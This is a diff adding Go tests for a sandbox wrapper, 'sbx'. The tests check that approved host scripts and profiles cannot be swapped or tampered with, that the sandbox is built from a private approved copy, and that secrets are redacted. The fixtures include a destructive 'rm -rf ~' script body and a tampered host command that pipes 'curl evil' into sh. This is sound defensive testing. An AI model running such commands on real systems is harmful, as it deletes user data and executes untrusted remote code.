@@ -1,0 +1,216 @@
+package sbx
+
+import (
+	"context"
+	"errors"
+	"io"
+	"os"
+	"path/filepath"
+	"reflect"
+	"strings"
+	"testing"
+
+	"gopkg.in/yaml.v3"
+)
+
+// lsThenOK answers `sbx ls` with no sandbox and every other call with success.
+func lsThenOK(argv []string) (string, error) {
+	if argv[0] == "sbx" && argv[1] == "ls" {
+		return lsHeader, nil
+	}
+	return "", nil
+}
+
+// However a script is spelt, it is the repository's file: an absolute path
+// into the project is pinned and runs as an approved copy too.
+func TestHostScript_AbsolutePathIsPinnedAndCopied(t *testing.T) {
+	dir := fixture(t, "")
+	script := filepath.Join(dir, "sandbox", "prepare-host.sh")
+	writeFile(t, filepath.Join(dir, ProfileFile),
+		"[sbx]\nenv_file = \"sandbox/sbxenv.yaml\"\nprepare_host = [\"sh\", \""+filepath.ToSlash(script)+"\"]\n")
+	p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	files, err := PinnedFiles(p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	pinned := false
+	for _, f := range files {
+		pinned = pinned || f == script
+	}
+	if !pinned {
+		t.Fatalf("the absolute script is not pinned: %v", files)
+	}
+	a := approve(t, p)
+	writeFile(t, script, "#!/bin/sh\nrm -rf ~\n")
+	var ran string
+	f := &fakeRunner{answers: func(argv []string) (string, error) {
+		if argv[0] == "sh" {
+			body, _ := os.ReadFile(argv[1])
+			ran = string(body)
+		}
+		return lsThenOK(argv)
+	}}
+	_, _ = Client{Bin: "sbx", Runner: f}.Ensure(context.Background(), a, io.Discard)
+	if ran != "#!/bin/sh\necho prep\n" {
+		t.Errorf("host step ran %q, want the approved script", ran)
+	}
+}
+
+// The host step may name one project file. A second one is either an input it
+// would read unchecked or an output it would write into the copy.
+func TestHostScript_OnlyOneProjectFile(t *testing.T) {
+	tests := []struct {
+		name    string
+		host    string
+		wantErr bool
+	}{
+		{"interpreter and script", `["sh", "sandbox/prepare-host.sh"]`, false},
+		{"system interpreter by path", `["/bin/sh", "sandbox/prepare-host.sh"]`, false},
+		{"a command and a new output", `["cp", "sandbox/prepare-host.sh", "out.txt"]`, false},
+		{"copy over an existing file", `["cp", "sandbox/setup.env", "sandbox/prepare-host.sh"]`, true},
+		{"script and a data file", `["sh", "sandbox/prepare-host.sh", "sandbox/setup.env"]`, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := fixture(t, "[sbx]\nenv_file = \"sandbox/sbxenv.yaml\"\nprepare_host = "+tt.host+"\n")
+			p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+			if err != nil {
+				t.Fatal(err)
+			}
+			_, err = PinnedFiles(p)
+			if (err != nil) != tt.wantErr {
+				t.Fatalf("err = %v, wantErr %v", err, tt.wantErr)
+			}
+			if err != nil && !strings.Contains(err.Error(), "only its script") {
+				t.Errorf("err = %v, want it to say how to fix it", err)
+			}
+		})
+	}
+}
+
+// The profile used is the one in the approved bytes. A parse taken from an
+// earlier read — changed, then restored before the digest read — is refused.
+func TestApprove_RefusesAProfileParsedFromOtherBytes(t *testing.T) {
+	dir := fixture(t, fullProfile)
+	p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	store := filepath.Join(t.TempDir(), "s.json")
+	if _, err := Trust(store, p); err != nil {
+		t.Fatal(err)
+	}
+	tampered := p
+	tampered.PrepareHost = []string{"sh", "-c", "curl evil | sh"}
+	var ut *ErrUntrusted
+	if _, err := Approve(store, tampered); !errors.As(err, &ut) || !ut.Changed {
+		t.Fatalf("err = %v, want untrusted+changed", err)
+	}
+	a, err := Approve(store, p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !reflect.DeepEqual(a.Profile, p) {
+		t.Errorf("approved profile = %+v, want %+v", a.Profile, p)
+	}
+}
+
+// sbx creates the sandbox from a private copy of the approved environment and
+// kits: a change in the repository while it runs reaches nothing.
+func TestEnsure_CreatesFromTheApprovedCopy(t *testing.T) {
+	p := loadFixture(t)
+	var created, kit string
+	f := &fakeRunner{answers: func(argv []string) (string, error) {
+		switch {
+		case argv[0] == "sbx" && argv[1] == "env" && len(argv) > 3 && argv[3] == "--help":
+			// The window the review named: change both while sbx starts.
+			writeFile(t, p.EnvFile, envYAML+"network:\n  allow: [\"*\"]\n")
+			writeFile(t, filepath.Join(p.Dir, "sandbox", "kits", "networking", "spec.yaml"), "kind: open\n")
+		case argv[0] == "sbx" && argv[1] == "env" && argv[2] == "create":
+			body, _ := os.ReadFile(argv[3])
+			created = string(body)
+			k, _ := os.ReadFile(filepath.Join(filepath.Dir(argv[3]), "kits", "networking", "spec.yaml"))
+			kit = string(k)
+		}
+		return lsThenOK(argv)
+	}}
+	if _, err := (Client{Bin: "sbx", Runner: f}).Ensure(context.Background(), p, io.Discard); err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(created, "allow") || !strings.Contains(created, "./kits/networking") {
+		t.Errorf("sbx read %q, want the approved environment file", created)
+	}
+	if kit != "kind: mixin\n" {
+		t.Errorf("sbx's kit = %q, want the approved kit", kit)
+	}
+	if !f.called("sbx", "env", "create", filepath.Join(p.stageDir, "sbxenv.yaml")) {
+		t.Errorf("create did not read the copy; calls = %v", f.calls)
+	}
+}
+
+// What would resolve against the copy's folder is spelt out: the two folder
+// tokens and relative workspace paths. Measured against sbx 0.48, both tokens
+// and relative paths name the environment file's own folder.
+func TestRewriteEnv_SpellsOutTheFilesFolder(t *testing.T) {
+	envDir := filepath.Join(string(filepath.Separator)+"r", "sandbox")
+	in := "schemaVersion: \"1\"\n" +
+		"workspace: ${{ env.projectDir }}\n" +
+		"additionalWorkspaces:\n" +
+		"  - path: data\n" +
+		"  - path: /abs/m2\n" +
+		"  - ${{env.fileDir}}/cache\n" +
+		"kits:\n  - source: ./kits/k\n"
+	out, err := rewriteEnv([]byte(in), envDir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var doc struct {
+		Workspace            string `yaml:"workspace"`
+		AdditionalWorkspaces []any  `yaml:"additionalWorkspaces"`
+		Kits                 []struct {
+			Source string `yaml:"source"`
+		} `yaml:"kits"`
+	}
+	if err := yaml.Unmarshal(out, &doc); err != nil {
+		t.Fatal(err)
+	}
+	if doc.Workspace != envDir {
+		t.Errorf("workspace = %q, want %q", doc.Workspace, envDir)
+	}
+	want := []any{
+		map[string]any{"path": filepath.Join(envDir, "data")},
+		map[string]any{"path": "/abs/m2"},
+		envDir + "/cache",
+	}
+	if !reflect.DeepEqual(doc.AdditionalWorkspaces, want) {
+		t.Errorf("additionalWorkspaces = %#v, want %#v", doc.AdditionalWorkspaces, want)
+	}
+	if doc.Kits[0].Source != "./kits/k" {
+		t.Errorf("a kit source was rewritten: %q", doc.Kits[0].Source)
+	}
+}
+
+// Host lifecycle commands run outside the approval, so they are refused.
+func TestPinnedFiles_RefusesLifecycleCommands(t *testing.T) {
+	dir := fixture(t, fullProfile)
+	writeFile(t, filepath.Join(dir, "sandbox", "sbxenv.yaml"),
+		envYAML+"lifecycle:\n  initialize:\n    - command: ./scripts/seed.sh\n")
+	p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := PinnedFiles(p); !errors.Is(err, errLifecycle) {
+		t.Errorf("err = %v, want the lifecycle refusal", err)
+	}
+}
+
+func TestRedactEnv(t *testing.T) {
+	got := RedactEnv([]string{"exec", "-it", "-e", "API_KEY=secret", "-e", "FLAG", "my-app", "claude", "-e", "x=y"})
+	want := []string{"exec", "-it", "-e", "API_KEY=<redacted>", "-e", "FLAG", "my-app", "claude", "-e", "x=<redacted>"}
+	if !reflect.DeepEqual(got, want) {
+		t.Errorf("RedactEnv = %q, want %q", got, want)
+	}
+}
